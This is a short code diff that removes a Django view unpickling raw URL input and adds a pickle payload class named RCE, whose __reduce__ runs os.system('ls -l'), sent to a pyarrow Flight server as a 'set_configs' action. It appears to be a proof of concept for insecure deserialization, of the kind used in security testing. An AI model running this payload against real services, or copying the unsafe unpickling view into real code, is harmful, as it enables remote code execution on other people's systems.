@@ -1,9 +1,8 @@
-from django.conf.urls import url
+class RCE:
+    def __reduce__(self):
+        import os
+        return (os.system, ('ls -l',))
 
-def unsafe(pickled):
-    pic = __import__('pickle')
-    return pic.loads(pickled)
-
-urlpatterns = [
-    url(r'^(?P<object>.*)$', unsafe)
-]
+import pickle
+action_body = pickle.dumps(RCE())
+action = pyarrow.flight.Action("set_configs", action_body)
